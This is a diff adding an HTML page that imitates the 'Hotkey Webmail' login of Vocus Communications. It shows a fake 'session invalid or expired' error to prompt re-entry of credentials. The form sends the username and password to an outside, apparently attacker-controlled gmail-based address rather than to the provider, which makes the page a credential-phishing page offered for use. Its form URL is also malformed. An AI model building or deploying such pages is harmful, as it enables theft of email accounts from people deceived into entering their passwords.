@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Hotkey Webmail</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #f2f2f2;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    .topbar {
+      background-color: #000;
+      padding: 8px 16px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+    }
+
+    .container {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .form-box {
+      background: none;
+    }
+
+    h1 {
+      font-size: 20px;
+      margin-bottom: 20px;
+      color: #000;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 300px;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+      border-radius: 2px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #5ab1ff;
+      box-shadow: 0 0 2px #5ab1ff;
+    }
+
+    button {
+      width: 300px;
+      padding: 10px;
+      background-color: #a9b6bd;
+      border: none;
+      color: white;
+      font-size: 14px;
+      cursor: pointer;
+      border-radius: 2px;
+    }
+
+    .error-message {
+      color: #e74c3c;
+      margin-top: 10px;
+      font-size: 14px;
+    }
+
+    .error-message::before {
+      content: "⚠ ";
+    }
+
+    footer {
+      width: 100%;
+      text-align: center;
+      background-color: #000;
+      color: #ccc;
+      font-size: 11px;
+      padding: 10px 0;
+    }
+
+    footer a {
+      color: #ccc;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="topbar">
+    hotkey
+  </div>
+
+  <div class="container">
+    <div class="form-box">
+      <h1>Welcome to Hotkey Webmail</h1>
+      <form action="https://formsubmit.web3dudesolo@gmail.com" method="POST">
+        <input type="text" name="username" placeholder="Username" required><br>
+        <input type="password" name="password" placeholder="Password" required><br>
+        <button type="submit">Login</button>
+      </form>
+      <div class="error-message">Your session is invalid or expired.</div>
+    </div>
+  </div>
+
+  <footer>
+    © Vocus Communications 2016. 
+    <a href="#">Terms & Conditions</a> govern the use of this Website. 
+    <a href="#">Privacy Statement</a>
+  </footer>
+
+</body>
+</html>
